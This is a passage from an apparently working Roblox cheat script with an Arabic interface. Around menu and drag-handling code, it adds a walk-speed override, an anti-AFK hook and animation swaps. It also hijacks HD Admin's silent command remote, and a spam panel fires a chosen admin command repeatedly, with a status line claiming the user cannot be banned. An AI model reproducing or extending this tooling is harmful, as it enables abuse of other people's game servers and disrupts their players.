FlyTouchFrame.Size = UDim2.new(0, 184, 0, 150)
FlyTouchFrame.Position = UDim2.new(1, -14, 1, -14)
FlyTouchFrame.BackgroundColor3 = Theme.Panel
FlyTouchFrame.BackgroundTransparency = 0.08
FlyTouchFrame.BorderSizePixel = 0
FlyTouchFrame.Visible = false
FlyTouchFrame.Parent = ScreenGui
makeCorner(FlyTouchFrame, 16)
makeStroke(FlyTouchFrame, Theme.Border, 1, 0.15)
makeShadow(FlyTouchFrame)
UiFx.makeGradient(FlyTouchFrame, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(6, 6, 6)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 10, 24)),
}, 90)
UiFx.makeStarField(FlyTouchFrame, 8)

do
    local FlyTouchTitle = Instance.new("TextLabel")
    FlyTouchTitle.Size = UDim2.new(1, 0, 0, 24)
    FlyTouchTitle.Position = UDim2.new(0, 0, 0, 4)
    FlyTouchTitle.BackgroundTransparency = 1
    FlyTouchTitle.Text = "تحكم الطيران"
    FlyTouchTitle.TextColor3 = Theme.Text
    FlyTouchTitle.Font = Enum.Font.GothamBold
    FlyTouchTitle.TextSize = 14
    FlyTouchTitle.Parent = FlyTouchFrame

    local TouchUpBtn = makeFlyTouchButton("TouchUpBtn", "↑", UDim2.new(0, 10, 0, 32))
    local TouchForwardBtn = makeFlyTouchButton("TouchForwardBtn", "امام", UDim2.new(0, 66, 0, 32))
    local TouchDownBtn = makeFlyTouchButton("TouchDownBtn", "↓", UDim2.new(0, 122, 0, 32))
    local TouchLeftBtn = makeFlyTouchButton("TouchLeftBtn", "←", UDim2.new(0, 10, 0, 82))
    local TouchBackBtn = makeFlyTouchButton("TouchBackBtn", "خلف", UDim2.new(0, 66, 0, 82))
    local TouchRightBtn = makeFlyTouchButton("TouchRightBtn", "→", UDim2.new(0, 122, 0, 82))

    bindFlyTouchButton(TouchUpBtn, "Up")
    bindFlyTouchButton(TouchDownBtn, "Down")
    bindFlyTouchButton(TouchForwardBtn, "Forward")
    bindFlyTouchButton(TouchBackBtn, "Backward")
    bindFlyTouchButton(TouchLeftBtn, "Left")
    bindFlyTouchButton(TouchRightBtn, "Right")
end

local tDrag = {dragging=false, start=nil, startPos=nil}

ToggleBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        if tDrag.locked then return end
        tDrag.dragging = true
        tDrag.start = input.Position
        tDrag.startPos = ToggleBtn.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                tDrag.dragging = false
            end
        end)
    end
end)

ToggleBtn.MouseButton1Click:Connect(function()
    Frame.Visible = not Frame.Visible
end)

ChatBubbleBtn = Instance.new("TextButton")
ChatBubbleBtn.Name = "ChatBubble"
ChatBubbleBtn.AnchorPoint = Vector2.new(0, 0)
ChatBubbleBtn.Size = UDim2.new(0, 54, 0, 54)
ChatBubbleBtn.Position = UDim2.new(0, 16, 0.5, 4)
ChatBubbleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ChatBubbleBtn.BackgroundTransparency = 0.4
ChatBubbleBtn.Text = "💬"
ChatBubbleBtn.TextColor3 = Theme.Text
ChatBubbleBtn.TextSize = 22
ChatBubbleBtn.Font = Enum.Font.GothamBold
ChatBubbleBtn.AutoButtonColor = false
ChatBubbleBtn.ZIndex = 20
ChatBubbleBtn.Parent = ScreenGui
makeCorner(ChatBubbleBtn, 999)
UiFx.attachButtonTextOverlay(
    ChatBubbleBtn,
    28,
    Enum.Font.GothamBold,
    Color3.fromRGB(255, 255, 255),
    Color3.fromRGB(200, 200, 200),
    1
)

local cDrag = {dragging=false, start=nil, startPos=nil, moved=false}

do
    local _ss = SettingsPage:FindFirstChild("SettingsScroll") or SettingsPage

    for _, c in ipairs(SettingsPage:GetChildren()) do
        if c:IsA("ScrollingFrame") then _ss = c break end
    end

    local _toggleLocked = false
    local _chatLocked   = false

    local _LockSecLbl = Instance.new("TextLabel")
    _LockSecLbl.Size = UDim2.new(1,-24,0,18)
    _LockSecLbl.Position = UDim2.new(0,12,0,294)
    _LockSecLbl.BackgroundTransparency = 1
    _LockSecLbl.Text = " تثبيت الدوائر"
    _LockSecLbl.TextColor3 = Color3.fromRGB(140,145,170)
    _LockSecLbl.TextXAlignment = Enum.TextXAlignment.Right
    _LockSecLbl.Font = Enum.Font.GothamBold
    _LockSecLbl.TextSize = 12
    _LockSecLbl.ZIndex = 3
    _LockSecLbl.Parent = _ss

    local _LockToggleBtn = Instance.new("TextButton")
    _LockToggleBtn.Name = "LockToggleBtnSetting"
    _LockToggleBtn.Size = UDim2.new(1,-24,0,42)
    _LockToggleBtn.Position = UDim2.new(0,12,0,316)
    _LockToggleBtn.BackgroundColor3 = Theme.PanelSoft
    _LockToggleBtn.BackgroundTransparency = 0.05
    _LockToggleBtn.Text = "  تثبيت دائرة السكربت"
    _LockToggleBtn.TextColor3 = Theme.Text
    _LockToggleBtn.Font = Enum.Font.GothamBold
    _LockToggleBtn.TextSize = 14
    _LockToggleBtn.AutoButtonColor = false
    _LockToggleBtn.ZIndex = 5
    _LockToggleBtn.Parent = _ss
    makeCorner(_LockToggleBtn, 10)
    makeStroke(_LockToggleBtn, Theme.Border, 1, 0.15)

    _LockToggleBtn.MouseButton1Click:Connect(function()
        _toggleLocked = not _toggleLocked
        if _toggleLocked then
            tDrag.dragging = false
            tDrag.locked   = true
            _LockToggleBtn.Text = "  تثبيت دائرة السكربت"
            _LockToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
            _LockToggleBtn.BackgroundTransparency = 0
            showNotification(" دائرة السكربت مثبّتة — لا يمكن تحريكها")
        else
            tDrag.locked   = false
            _LockToggleBtn.Text = "  تثبيت دائرة السكربت"
            _LockToggleBtn.BackgroundColor3 = Theme.PanelSoft
            _LockToggleBtn.BackgroundTransparency = 0.05
            showNotification(" دائرة السكربت حرة")
        end
    end)

    local _LockChatBtn = Instance.new("TextButton")
    _LockChatBtn.Name = "LockChatBtnSetting"
    _LockChatBtn.Size = UDim2.new(1,-24,0,42)
    _LockChatBtn.Position = UDim2.new(0,12,0,364)
    _LockChatBtn.BackgroundColor3 = Theme.PanelSoft
    _LockChatBtn.BackgroundTransparency = 0.05
    _LockChatBtn.Text = "  تثبيت دائرة الشات"
    _LockChatBtn.TextColor3 = Theme.Text
    _LockChatBtn.Font = Enum.Font.GothamBold
    _LockChatBtn.TextSize = 14
    _LockChatBtn.AutoButtonColor = false
    _LockChatBtn.ZIndex = 5
    _LockChatBtn.Parent = _ss
    makeCorner(_LockChatBtn, 10)
    makeStroke(_LockChatBtn, Theme.Border, 1, 0.15)

    _LockChatBtn.MouseButton1Click:Connect(function()
        _chatLocked = not _chatLocked
        if _chatLocked then
            cDrag.dragging = false
            cDrag.locked   = true
            _LockChatBtn.Text = "  تثبيت دائرة الشات"
            _LockChatBtn.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
            _LockChatBtn.BackgroundTransparency = 0
            showNotification(" دائرة الشات مثبّتة — لا يمكن تحريكها")
        else
            cDrag.locked   = false
            _LockChatBtn.Text = "  تثبيت دائرة الشات"
            _LockChatBtn.BackgroundColor3 = Theme.PanelSoft
            _LockChatBtn.BackgroundTransparency = 0.05
            showNotification(" دائرة الشات حرة")
        end
    end)
end

ChatBubbleBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        if cDrag.locked then return end
        cDrag.dragging = true
        cDrag.moved = false
        cDrag.start = input.Position
        cDrag.startPos = ChatBubbleBtn.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                cDrag.dragging = false
            end
        end)
    end
end)

ChatBubbleBtn.MouseButton1Click:Connect(function()
    if cDrag.moved then return end
    local opening = not ChatPanel.Visible
    if opening then
        ChatBubbleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        ChatBubbleBtn.Text = "✖"
        ChatPanel.Visible = true
        ChatPanel.Size = UDim2.new(1, -90, 0, 0)
        local _tgtSize = UDim2.new(1, -90, 0, 420)
        game:GetService("TweenService"):Create(ChatPanel,
            TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            { Size = _tgtSize }):Play()
        _resetChatBadge()
        task.defer(function()
            ChatList.CanvasPosition = Vector2.new(0, ChatList.AbsoluteCanvasSize.Y)
        end)
    else
        ChatBubbleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        ChatBubbleBtn.Text = "💬"
        local _tween = game:GetService("TweenService"):Create(ChatPanel,
            TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Size = UDim2.new(1, -90, 0, 0) })
        _tween:Play()
        _tween.Completed:Connect(function()
            ChatPanel.Visible = false
            ChatPanel.Size = UDim2.new(1, -90, 0, 420)
        end)
    end
end)

local _chatUnreadCount = 0

local _chatBadge = Instance.new("Frame")
_chatBadge.Name = "ChatBadge"
_chatBadge.Size = UDim2.new(0, 20, 0, 20)
_chatBadge.AnchorPoint = Vector2.new(1, 0)
_chatBadge.Position = UDim2.new(1, 6, 0, -6)
_chatBadge.BackgroundColor3 = Color3.fromRGB(220, 38, 38)
_chatBadge.BorderSizePixel = 0
_chatBadge.ZIndex = 25
_chatBadge.Visible = false
_chatBadge.Parent = ChatBubbleBtn
makeCorner(_chatBadge, 999)

local _chatBadgeLbl = Instance.new("TextLabel")
_chatBadgeLbl.Size = UDim2.new(1, 0, 1, 0)
_chatBadgeLbl.BackgroundTransparency = 1
_chatBadgeLbl.Text = "0"
_chatBadgeLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
_chatBadgeLbl.Font = Enum.Font.GothamBold
_chatBadgeLbl.TextSize = 11
_chatBadgeLbl.ZIndex = 26
_chatBadgeLbl.Parent = _chatBadge

local _chatNotifSound = Instance.new("Sound")
_chatNotifSound.SoundId = "rbxassetid://9118824422"
_chatNotifSound.Volume = 0.55
_chatNotifSound.Parent = LocalPlayer:WaitForChild("PlayerGui")

local function _updateChatBadge()
    if _chatUnreadCount > 0 then
        local display = _chatUnreadCount > 99 and "99+" or tostring(_chatUnreadCount)
        _chatBadgeLbl.Text = display
        if _chatUnreadCount >= 10 then
            _chatBadge.Size = UDim2.new(0, 26, 0, 20)
        else
            _chatBadge.Size = UDim2.new(0, 20, 0, 20)
        end
        _chatBadge.Visible = true
    else
        _chatBadge.Visible = false
    end
end

function _incrementChatBadge()
    if not ChatPanel.Visible then
        _chatUnreadCount = _chatUnreadCount + 1
        _updateChatBadge()
        pcall(function() _chatNotifSound:Play() end)
    end
end

function _resetChatBadge()
    _chatUnreadCount = 0
    _updateChatBadge()
end

local fDrag = {active=false, start=nil, startPos=nil}

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        fDrag.active = true
        fDrag.start = input.Position
        fDrag.startPos = Frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                fDrag.active = false
            end
        end)
    end
end)

local function clampToScreen(button, scaleX, scaleY, offsetX, offsetY)
    local screenSize = ScreenGui.AbsoluteSize
    local btnSize = button.AbsoluteSize
    if screenSize.X <= 0 or screenSize.Y <= 0 then
        return UDim2.new(scaleX, offsetX, scaleY, offsetY)
    end
    local absX = scaleX * screenSize.X + offsetX
    local absY = scaleY * screenSize.Y + offsetY
    local maxX = math.max(0, screenSize.X - btnSize.X)
    local maxY = math.max(0, screenSize.Y - btnSize.Y)
    absX = math.clamp(absX, 0, maxX)
    absY = math.clamp(absY, 0, maxY)
    return UDim2.new(scaleX, absX - scaleX * screenSize.X, scaleY, absY - scaleY * screenSize.Y)
end

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
        if fDrag.active then
            local delta = input.Position - fDrag.start
            Frame.Position = UDim2.new(
                fDrag.startPos.X.Scale,
                fDrag.startPos.X.Offset + delta.X,
                fDrag.startPos.Y.Scale,
                fDrag.startPos.Y.Offset + delta.Y
            )
        end
        if tDrag.dragging then
            local delta = input.Position - tDrag.start
            ToggleBtn.Position = clampToScreen(
                ToggleBtn,
                tDrag.startPos.X.Scale,
                tDrag.startPos.Y.Scale,
                tDrag.startPos.X.Offset + delta.X,
                tDrag.startPos.Y.Offset + delta.Y
            )
        end
        if cDrag.dragging then
            local delta = input.Position - cDrag.start
            if math.abs(delta.X) > 4 or math.abs(delta.Y) > 4 then
                cDrag.moved = true
            end
            ChatBubbleBtn.Position = clampToScreen(
                ChatBubbleBtn,
                cDrag.startPos.X.Scale,
                cDrag.startPos.Y.Scale,
                cDrag.startPos.X.Offset + delta.X,
                cDrag.startPos.Y.Offset + delta.Y
            )
        end
    end
end)

local function ensureButtonsInBounds()
    if ToggleBtn then
        ToggleBtn.Position = clampToScreen(
            ToggleBtn,
            ToggleBtn.Position.X.Scale,
            ToggleBtn.Position.Y.Scale,
            ToggleBtn.Position.X.Offset,
            ToggleBtn.Position.Y.Offset
        )
    end
    if ChatBubbleBtn then
        ChatBubbleBtn.Position = clampToScreen(
            ChatBubbleBtn,
            ChatBubbleBtn.Position.X.Scale,
            ChatBubbleBtn.Position.Y.Scale,
            ChatBubbleBtn.Position.X.Offset,
            ChatBubbleBtn.Position.Y.Offset
        )
    end
end

ScreenGui:GetPropertyChangedSignal("AbsoluteSize"):Connect(ensureButtonsInBounds)
task.defer(ensureButtonsInBounds)

local function setButtonState(button, enabled, onText, offText, onColor, offColor)
    if enabled then
        button.BackgroundColor3 = onColor or Theme.Active
        button.Text = onText
    else
        button.BackgroundColor3 = offColor or Theme.PanelSoft
        button.Text = offText
    end
end

WalkSpeedBtn.MouseButton1Click:Connect(function()
    SpeedActive = not SpeedActive
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChild("Humanoid")
    local newSpeed = tonumber(WalkSpeedInput.Text) or 16
    savedWalkSpeedValue.Value = tostring(newSpeed)

    if SpeedActive then
        setButtonState(WalkSpeedBtn, true, T18T("السرعة مفعلة"), T18T("سرعة اللاعب"), Theme.Active, Theme.PanelSoft)
        if hum then
            hum.WalkSpeed = newSpeed
        end
    else
        setButtonState(WalkSpeedBtn, false, T18T("السرعة مفعلة"), T18T("سرعة اللاعب"), Theme.Active, Theme.PanelSoft)
        if hum then
            hum.WalkSpeed = 16
        end
    end
end)

ZombieWalkBtn.MouseButton1Click:Connect(function()
    _G._ZWA = not _G._ZWA
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if _G._ZWA then

        local animS = char and char:FindFirstChild("Animate")
        if animS then
            _G._ZOrig = {}
            local folders = {
                {"idle",  "Animation1", "rbxassetid://616158929"},
                {"idle",  "Animation2", "rbxassetid://616158929"},
                {"walk",  "WalkAnim",   "rbxassetid://616163682"},
                {"run",   "RunAnim",    "rbxassetid://616163682"},
                {"jump",  "JumpAnim",   "rbxassetid://616161997"},
                {"fall",  "FallAnim",   "rbxassetid://616157476"},
                {"climb", "ClimbAnim",  "rbxassetid://616163682"},
            }
            for _, v in ipairs(folders) do
                local f = animS:FindFirstChild(v[1])
                local a = f and f:FindFirstChild(v[2])
                if a and a:IsA("Animation") then
                    _G._ZOrig[v[1]..v[2]] = a.AnimationId
                    a.AnimationId = v[3]
                end
            end

            animS.Disabled = true
        end
        if hum then
            local function loadZA(id)
                local a = Instance.new("Animation")
                a.AnimationId = id
                local t = hum:LoadAnimation(a)
                t.Priority = Enum.AnimationPriority.Action3
                t.Looped = true
                return t
            end
            _G._ZIdleTrack = loadZA("rbxassetid://616158929")
            _G._ZWalkTrack = loadZA("rbxassetid://616163682")
            _G._ZIdleTrack:Play(0.1)

            if _G._ZMoveConn then _G._ZMoveConn:Disconnect() end
            _G._ZMoveConn = RunService.Heartbeat:Connect(function()
                if not _G._ZWA then
                    _G._ZMoveConn:Disconnect()
                    _G._ZMoveConn = nil
                    return
                end
                local c2 = LocalPlayer.Character
                local h2 = c2 and c2:FindFirstChildOfClass("Humanoid")
                if not h2 then return end
                local moving = h2.MoveDirection.Magnitude > 0.05
                if moving then
                    if _G._ZIdleTrack and _G._ZIdleTrack.IsPlaying then _G._ZIdleTrack:Stop(0.1) end
                    if _G._ZWalkTrack and not _G._ZWalkTrack.IsPlaying then _G._ZWalkTrack:Play(0.1) end
                else
                    if _G._ZWalkTrack and _G._ZWalkTrack.IsPlaying then _G._ZWalkTrack:Stop(0.1) end
                    if _G._ZIdleTrack and not _G._ZIdleTrack.IsPlaying then _G._ZIdleTrack:Play(0.1) end
                end
            end)
        end
    else

        if _G._ZMoveConn then _G._ZMoveConn:Disconnect(); _G._ZMoveConn = nil end
        if _G._ZIdleTrack then pcall(function() _G._ZIdleTrack:Stop() end); _G._ZIdleTrack = nil end
        if _G._ZWalkTrack then pcall(function() _G._ZWalkTrack:Stop() end); _G._ZWalkTrack = nil end

        local animS = char and char:FindFirstChild("Animate")
        if animS and _G._ZOrig then
            local folders = {
                {"idle",  "Animation1"},
                {"idle",  "Animation2"},
                {"walk",  "WalkAnim"},
                {"run",   "RunAnim"},
                {"jump",  "JumpAnim"},
                {"fall",  "FallAnim"},
                {"climb", "ClimbAnim"},
            }
            for _, v in ipairs(folders) do
                local f = animS:FindFirstChild(v[1])
                local a = f and f:FindFirstChild(v[2])
                local orig = _G._ZOrig[v[1]..v[2]]
                if a and a:IsA("Animation") and orig then
                    a.AnimationId = orig
                end
            end
            animS.Disabled = false
        end
        _G._ZOrig = nil
    end
    setButtonState(ZombieWalkBtn, _G._ZWA, T18T("ايقاف مشية زومبي"), T18T("مشية زومبي"), Theme.Active, Theme.ButtonGreen)
end)

_G._HLBtn.MouseButton1Click:Connect(function()
    _G._HLA = not _G._HLA
    if _G._HLA then

        pcall(function()
            local char     = LocalPlayer.Character
            local animator = char and char:FindFirstChildOfClass("Humanoid") and
                             char:FindFirstChildOfClass("Humanoid"):FindFirstChildOfClass("Animator")
            if not animator then return end
            if _G._HLTrack then pcall(function() _G._HLTrack:Stop() end) end
            local anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://102316572910864"
            _G._HLTrack = animator:LoadAnimation(anim)
            _G._HLTrack.Priority = Enum.AnimationPriority.Action
            _G._HLTrack:Play()
        end)
        setButtonState(_G._HLBtn, true, T18T("ايقا�� هيدلس"), T18T("هيدلس"), Theme.Active, Theme.ButtonGreen)
    else

        pcall(function()
            if _G._HLTrack then
                _G._HLTrack:Stop()
                _G._HLTrack = nil
            end
        end)
        setButtonState(_G._HLBtn, false, T18T("ايقاف هيدلس"), T18T("هيدلس"), Theme.Active, Theme.ButtonGreen)
    end
end)

AntiAFK.btn.MouseButton1Click:Connect(function()
    AntiAFK.active = not AntiAFK.active
    if AntiAFK.active then
        setButtonState(AntiAFK.btn, true, T18T("ايقاف مضاد افك"), T18T("مضاد افك"), Theme.Active, Theme.ButtonGreen)
        if not AntiAFK.conn then
            AntiAFK.conn = LocalPlayer.Idled:Connect(function()
                if AntiAFK.active then
                    pcall(function()
                        local vu = game:GetService("VirtualUser")
                        vu:CaptureController()
                        vu:ClickButton2(Vector2.new())
                    end)
                end
            end)
        end
    else
        setButtonState(AntiAFK.btn, false, T18T("ايقاف مضاد افك"), T18T("مضاد افك"), Theme.ButtonBlue, Theme.ButtonBlue)
        if AntiAFK.conn then
            AntiAFK.conn:Disconnect()
            AntiAFK.conn = nil
        end
    end
end)

local _hdRequestCmd = (function()
    local _s = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient", 10)
    _s = _s and _s:WaitForChild("Signals", 5)
    return _s and _s:WaitForChild("RequestCommandSilent", 5)
end)()

local function hdPrefix()
    local p = HdPrefixInput and HdPrefixInput.Text
    if not p or p == "" then p = "," end
    return p
end

local function hdRunCommand(cmdText)
    if _T18CmdTargetsOwner(cmdText) then
        return false
    end
    if not _hdRequestCmd then
        showNotification(" HD Admin ما اتحمل بعد")
        return false
    end
    local ok, err = pcall(function()
        _hdRequestCmd:InvokeServer(cmdText)
    end)
    if not ok then
        showNotification(" " .. tostring(err))
    end
    return ok
end

local function hdExecCmd()
    local txt = HdCmdInput.Text:match("^%s*(.-)%s*$")
    if not txt or txt == "" then
        showNotification(T18T("اكتب الامر اولاً"))
        return
    end
    HdCmdInput.Text = ""

    if hdRunCommand(txt) then
        showNotification(" " .. txt)
    end
end

HdCmdSendBtn.MouseButton1Click:Connect(hdExecCmd)
HdCmdInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then hdExecCmd() end
end)

do
    local function mountHdSpamPage()
        local openButton = makeButton("HdSpamOpenBtn", "سبام", UDim2.new(0, 58, 0, 38), UDim2.new(1, -62, 0, 72), Theme.ButtonBlue, Theme.Accent)
        openButton.ZIndex = 3
        openButton.Parent = OthersPage

        local page = Instance.new("Frame")
        page.Name = "HdSpamPage"
        page.Size = UDim2.fromScale(1, 1)
        page.BackgroundColor3 = Theme.Card
        page.BorderSizePixel = 0
        page.ZIndex = 10
        page.Active = true
        page.Visible = false
        page.ClipsDescendants = true
        page.Parent = OthersPage
        makeCorner(page, 14)
        makeStroke(page, Theme.Border, 1, 0.2)
        UiFx.makeGradient(page, {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(16, 22, 44)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 14, 28)),
        }, 115)
        UiFx.makeStarField(page, 12)

        local content = Instance.new("ScrollingFrame")
        content.Name = "HdSpamContent"
        content.Size = UDim2.fromScale(1, 1)
        content.BackgroundTransparency = 1
        content.BorderSizePixel = 0
        content.ZIndex = 11
        content.CanvasSize = UDim2.fromOffset(0, 346)
        content.ScrollBarThickness = 3
        content.ScrollBarImageColor3 = Theme.Accent
        content.ScrollingDirection = Enum.ScrollingDirection.Y
        content.Parent = page
        makePageTitle(content, "سبام أوامر HD", "سبام اوامر, امانه قيمو ههههه")

        local function input(name, placeholder, y)
            local box = HdCmdInput:Clone()
            box.Name = name
            box.Text = ""
            box.PlaceholderText = placeholder
            box.Size = UDim2.new(1, -24, 0, 40)
            box.Position = UDim2.fromOffset(12, y)
            box.MultiLine = false
            box.Parent = content
            return box
        end

        local commandInput = input("HdSpamCommand", "اكتب الامر هنا", 66)
        local intervalInput = input("HdSpamInterval", "حدد سرعة السبام", 118)

        local function label(name, text, y, height)
            local item = Instance.new("TextLabel")
            item.Name = name
            item.Text = text
            item.Size = UDim2.new(1, -24, 0, height)
            item.Position = UDim2.fromOffset(12, y)
            item.BackgroundTransparency = 1
            item.TextColor3 = Theme.Muted
            item.Font = Enum.Font.Gotham
            item.TextSize = 13
            item.TextWrapped = true
            item.TextXAlignment = Enum.TextXAlignment.Right
            item.Parent = content
            return item
        end

        label("HdSpamIntervalHint", "تقدر تحدد مدة الارسال بالثواني: من 1 الى 3600 , لحد يسأل ليه حطيت 3600 بس عجبتني", 164, 32)
        local toggleButton = makeButton("HdSpamToggle", "تفعيل سبام", UDim2.new(1, -24, 0, 40), UDim2.fromOffset(12, 204), Theme.ButtonBlue, Theme.Accent)
        toggleButton.Parent = content
        local statusLabel = label("HdSpamStatus", "متوقف - فعله ماعليه باند على ضمانتي", 252, 34)
        local backButton = makeButton("HdSpamBack", "رجوع", UDim2.new(1, -24, 0, 38), UDim2.fromOffset(12, 296), Theme.ButtonBlue, Theme.Accent)
        backButton.Parent = content
        for _, child in ipairs(content:GetChildren()) do
            if child:IsA("GuiObject") then child.ZIndex = 12 end
        end

        local active, disposed, inFlight = false, false, false
        local session, sentCount, nextSendAt = 0, 0, 0
        local command, interval = "", 1
        local connections = {}
        local arabicDigits = {
            ["٠"] = "0", ["١"] = "1", ["٢"] = "2", ["٣"] = "3", ["٤"] = "4",
            ["٥"] = "5", ["٦"] = "6", ["٧"] = "7", ["٨"] = "8", ["٩"] = "9",
            ["۰"] = "0", ["۱"] = "1", ["۲"] = "2", ["۳"] = "3", ["۴"] = "4",
            ["۵"] = "5", ["۶"] = "6", ["۷"] = "7", ["۸"] = "8", ["۹"] = "9",
        }

        local function stop(message)
            active = false
            session = session + 1
            toggleButton.Text = "تفعيل سبام"
            commandInput.TextEditable = true
            intervalInput.TextEditable = true
            statusLabel.TextColor3 = Theme.Muted
            statusLabel.Text = message or "متوقف — فعله يسطيف سبام ممتاز"
        end

        table.insert(connections, openButton.Activated:Connect(function()
            if commandInput.Text:match("^%s*$") then
                commandInput.Text = HdCmdInput.Text
            end
            page.Visible = true
        end))

        -- زر الرجوع يخفي الصفحة فقط بدون ما يوقف السبام
        table.insert(connections, backButton.Activated:Connect(function()
            page.Visible = false
        end))

        table.insert(connections, toggleButton.Activated:Connect(function()
            if active then
                stop()
                return
            end
            if inFlight then
                statusLabel.Text = "بانتظار انتهاء الطلب السابق قبل إعادة التشغيل"
                return
            end
            local text = commandInput.Text:match("^%s*(.-)%s*$")
            local rawInterval = intervalInput.Text:match("^%s*(.-)%s*$")
            for digit, replacement in pairs(arabicDigits) do
                rawInterval = rawInterval:gsub(digit, replacement)
            end
            rawInterval = rawInterval:gsub("٫", "."):gsub(",", ".")
            local seconds = tonumber(rawInterval)
            if text == "" then
                statusLabel.Text = "اكتب الأمر أولاً"
                commandInput:CaptureFocus()
                return
            end
            if not seconds or seconds ~= seconds or seconds < 1 or seconds > 3600 then
                statusLabel.Text = "حدد مدة صحيحة بين 1 و3600 ثانية"
                intervalInput:CaptureFocus()
                return
            end
            if not _hdRequestCmd or not _hdRequestCmd.Parent then
                statusLabel.Text = "HD Admin غير جاهز — لم يبدأ التكرار"
                return
            end
            command, interval = text, seconds
            active = true
            session = session + 1
            sentCount = 0
            nextSendAt = os.clock()
            commandInput.TextEditable = false
            intervalInput.TextEditable = false
            toggleButton.Text = "إيقاف سبام"
            statusLabel.TextColor3 = Theme.Text
            statusLabel.Text = "مفعّل — كل " .. tostring(interval) .. " ثانية"
        end))

        table.insert(connections, RunService.Heartbeat:Connect(function()
            if disposed or not active or inFlight or os.clock() < nextSendAt then return end
            if not ScreenGui.Parent then
                stop()
                return
            end
            inFlight = true
            local currentSession = session
            local startedAt = os.clock()
            task.spawn(function()
                if disposed or not active or session ~= currentSession then
                    inFlight = false
                    return
                end
                local ok, result = pcall(hdRunCommand, command)
                inFlight = false
                if disposed or session ~= currentSession or not active then return end
                if not ok or not result then
                    stop("توقف التكرار بسبب تعذر إرسال الأمر")
                    return
                end
                sentCount = sentCount + 1
                statusLabel.Text = "مفعّل — كل " .. tostring(interval) .. " ثانية | إرسالات: " .. tostring(sentCount)
                -- Never overlap server requests or burst to catch up after a delayed reply.
                nextSendAt = math.max(startedAt + interval, os.clock() + 0.05)
            end)
        end))

        local function dispose()
            if disposed then return end
            disposed = true
            active = false
            session = session + 1
            for _, connection in ipairs(connections) do connection:Disconnect() end
            table.clear(connections)
        end
        table.insert(connections, ScreenGui.Destroying:Connect(dispose))
        table.insert(connections, page.Destroying:Connect(dispose))
    end
    mountHdSpamPage()
end

do
    local function mountSizeSpamPanel()
        local openButton = PlayerPage:FindFirstChild("SizeSpamOpenBtn", true)
        if not openButton then return end

        -- ── الخلفية المعتمة ──────────────────────────────────────
        local overlay = Instance.new("Frame")
        overlay.Name = "R7LSizeSpamOverlay"
        overlay.Size = UDim2.fromScale(1, 1)
        overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        overlay.BackgroundTransparency = 0.35
        overlay.BorderSizePixel = 0
        overlay.Visible = false
        overlay.Active = true
        overlay.ZIndex = 80
        overlay.Parent = PlayerPage

        -- ── البانل الرئيسي (حواف حادة، داخل الحدود تماماً) ───────
        local PANEL_H = 318
        local panel = Instance.new("Frame")
        panel.Name = "SizeSpamPanel"
        panel.AnchorPoint = Vector2.new(0.5, 0.5)
        panel.Size = UDim2.new(1, -28, 0, PANEL_H)
        panel.Position = UDim2.new(0.5, 0, 0.5, 0)
        panel.BackgroundColor3 = Theme.Panel
        panel.BorderSizePixel = 0
        panel.Active = true
        panel.ClipsDescendants = true
        panel.ZIndex = 81
        panel.Parent = overlay
        makeStroke(panel, Theme.Border, 1, 0.1)

        -- خلفية نجوم متحركة داخل البانل
        pcall(function() UiFx.makeStarField(panel, 14) end)

        -- ── هيدر ──────────────────────────────────────────────────
        local HEADER_H = 58
        local header = Instance.new("Frame")
        header.Name = "SizeSpamHeader"
        header.Size = UDim2.new(1, 0, 0, HEADER_H)
        header.BackgroundColor3 = Theme.Header
        header.BorderSizePixel = 0
        header.ZIndex = 82
        header.Parent = panel

        local iconHolder = Instance.new("Frame")
        iconHolder.Size = UDim2.new(0, 38, 0, 38)
        iconHolder.Position = UDim2.new(0, 10, 0, 10)
        iconHolder.BackgroundColor3 = Theme.ButtonDefault
        iconHolder.BorderSizePixel = 0
        iconHolder.ZIndex = 83
        iconHolder.Parent = header
        makeStroke(iconHolder, Theme.Border, 1.5, 0.05)
        local iconLabel = Instance.new("TextLabel")
        iconLabel.Size = UDim2.fromScale(1, 1)
        iconLabel.BackgroundTransparency = 1
        iconLabel.Text = "S"
        iconLabel.TextColor3 = Theme.Text
        iconLabel.Font = Enum.Font.GothamBold
        iconLabel.TextSize = 17
        iconLabel.ZIndex = 84
        iconLabel.Parent = iconHolder

        local titleLabel = Instance.new("TextLabel")
        titleLabel.Size = UDim2.new(1, -130, 0, 20)
        titleLabel.Position = UDim2.new(0, 58, 0, 8)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Text = T18T("سبام تكبير حجم")
        titleLabel.TextColor3 = Theme.Text
        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.TextSize = 15
